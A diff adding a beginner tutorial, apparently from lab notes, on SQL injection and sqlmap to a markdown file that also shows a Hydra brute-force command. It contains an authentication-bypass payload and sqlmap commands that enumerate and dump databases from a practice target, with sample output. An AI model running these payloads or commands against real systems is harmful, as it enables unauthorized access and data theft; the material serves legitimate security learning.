@@ -350,3 +350,227 @@ hydra -l bob -P wordlist.txt 10.0.0.5 http-get /admin -V
 ## References
 - THC Hydra repository — https://github.com/vanhauser-thc/thc-hydra
 - Kali tools — Hydra page — https://tools.kali.org/password-attacks/hydra
+
+# SQLMap: The Basics
+
+> A beginner-friendly, GitHub-ready guide converted from your notes.
+
+---
+
+## Table of Contents
+
+1. [Introduction](#introduction)
+2. [What is a Database & How Websites Use It](#what-is-a-database--how-websites-use-it)
+3. [How SQL Injection Works (example)](#how-sql-injection-works-example)
+4. [Types of SQL Injection Techniques](#types-of-sql-injection-techniques)
+5. [Introducing sqlmap](#introducing-sqlmap)
+6. [Common sqlmap Flags & Usage Examples (Cheat Sheet)](#common-sqlmap-flags--usage-examples-cheat-sheet)
+7. [Practical Walkthrough (from notes)](#practical-walkthrough-from-notes)
+8. [GET vs POST Testing](#get-vs-post-testing)
+9. [Safety & Legal Notes](#safety--legal-notes)
+10. [Further Reading & Resources](#further-reading--resources)
+11. [License](#license)
+
+---
+
+## Introduction
+
+SQL injection is one of the most common and damaging web application vulnerabilities. This guide explains the basics: what a database is, how web apps interact with databases via SQL, how SQL injection works, and how to use **sqlmap** (an automated SQL injection tool) to identify and extract data from vulnerable endpoints.
+
+> **Note:** Only perform testing against systems for which you have explicit permission. Unauthorized testing is illegal and unethical.
+
+---
+
+## What is a Database & How Websites Use It
+
+A **database** is a structured collection of data that applications use to store, modify, and retrieve information (e.g., users, products, logs). Databases are managed by a DBMS such as **MySQL**, **PostgreSQL**, **SQLite**, or **Microsoft SQL Server**.
+
+Websites interact with databases by issuing **SQL queries**. For example, a login form typically submits a username and password which the application uses to build a SQL query (server-side) to check credentials.
+
+**Example query** (normal login flow):
+
+```sql
+SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
+```
+
+If input is not properly sanitized, an attacker can inject extra SQL into user input which changes how the query behaves.
+
+---
+
+## How SQL Injection Works (example)
+
+If the application concatenates raw user input into the SQL statement, an attacker can supply input that closes the string and appends a logical condition. Consider the following example:
+
+- **Username:** `John`
+- **Password (attacker):** `abc' OR 1=1;-- -`
+
+The resulting query might look like:
+
+```sql
+SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
+```
+
+Because `OR 1=1` is always true, the `WHERE` clause can evaluate as true and the attacker may bypass authentication. The `--` sequence comments out the rest of the query.
+
+**Key point:** The initial single quote (`'`) after `abc` is necessary to break out of the expected string literal and inject a new condition.
+
+---
+
+## Types of SQL Injection Techniques
+
+Common techniques identified by sqlmap and attackers include:
+
+- **Boolean-based (content) blind** — infer data by asking true/false questions.
+- **Time-based blind** — use database delays (e.g., `SLEEP(5)`) to infer values.
+- **Error-based** — force the DBMS to throw errors that reveal information.
+- **Union-based** — combine attacker-controlled `SELECT`s with the original query using `UNION`.
+
+---
+
+## Introducing sqlmap
+
+**sqlmap** is an automated tool that detects and exploits SQL injection vulnerabilities. It ships with many Linux pentesting distributions or can be installed separately.
+
+- Run `sqlmap --help` to list flags.
+- Use `sqlmap --wizard` for an interactive guided flow (beginner-friendly).
+
+**Wizard example (interactive):**
+
+```bash
+sqlmap --wizard
+```
+
+The wizard will ask for the target URL and guide you through testing/extraction.
+
+---
+
+## Common sqlmap Flags & Usage Examples (Cheat Sheet)
+
+- `-u <url>` — target URL (use when testing GET parameters).
+- `--dbs` — enumerate database names.
+- `-D <database>` — specify a database for further actions.
+- `--tables` — list tables for the database provided with `-D`.
+- `-T <table>` — target a specific table for dumping.
+- `--dump` — extract table records.
+- `-r <file>` — load a saved HTTP request (useful for POST-based testing captured via proxy).
+- `--wizard` — interactive mode (guided experience).
+
+**Safety / helpful flags during testing**
+
+- `--batch` — non-interactive (assume default answers). Useful in scripts.
+- `--threads` — speed up requests (careful: can increase load).
+
+---
+
+## Practical Walkthrough (from notes)
+
+**Example vulnerable URL used for the walkthrough:**
+
+```
+http://sqlmaptesting.thm/search/cat=1
+```
+
+1. **Test the URL**
+
+```bash
+sqlmap -u "http://sqlmaptesting.thm/search/cat=1"
+```
+
+Terminal output may show detection of injectable parameter(s):
+
+- `GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable`
+- `GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable`
+
+sqlmap can report the identified injection point(s) along with payloads for different techniques (boolean-based, error-based, time-based, UNION, etc.). It will also attempt to fingerprint the back-end DBMS (e.g., MySQL) and server stack (e.g., Nginx, PHP).
+
+2. **Enumerate databases**
+
+```bash
+sqlmap -u "http://sqlmaptesting.thm/search/cat=1" --dbs
+```
+
+Example output (found databases):
+
+```
+available databases [2]:
+[*] users
+[*] members
+```
+
+3. **List tables in a selected database**
+
+```bash
+sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users --tables
+```
+
+Example output (tables):
+
+```
+Database: users
+[3 tables]
++-----------+
+| johnath   |
+| alexas    |
+| thomas    |
++-----------+
+```
+
+4. **Dump a table's records**
+
+```bash
+sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users -T thomas --dump
+```
+
+Example output (records):
+
+```
+Database: users
+Table: thomas
+[1 entry]
++---------------------+------------+---------+
+| Date                | name       | pass    |
++---------------------+------------+---------+
+| 09/09/2024          | Thomas THM | testing |
++---------------------+------------+---------+
+```
+
+> Note from original notes: sqlmap recognized possible password hashes in the `passhash` column and prompted whether to save and crack them.
+
+---
+
+## GET vs POST Testing
+
+- **GET-based testing**: target URLs with query parameters (e.g., `?id=1` or `/search/cat=1`) — use `-u`.
+- **POST-based testing**: capture the HTTP POST request via a proxy (Burp, OWASP ZAP) and save it to a file. Pass that file to sqlmap with `-r`:
+
+```bash
+sqlmap -r intercepted_request.txt
+```
+
+> Intercepting and saving POST requests is out-of-scope for this room but is a critical skill for testing login/registration endpoints.
+
+---
+
+## Safety & Legal Notes
+
+- Only test systems for which you have **explicit authorization**.
+- sqlmap sends multiple requests and can impose load on a target; use responsibly and avoid harming production systems.
+- Keep copies of authorization (scope, signed permission) whenever performing sanctioned assessments.
+
+---
+
+## Further Reading & Resources
+
+- Official sqlmap project: https://sqlmap.org
+- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
+- Burp Suite / OWASP ZAP — for intercepting and crafting HTTP requests
+
+---
+
+## License
+
+This document is formatted and offered under the **MIT License** by default. Paste into your repo and change the license if you prefer another.
+
+---
+
+
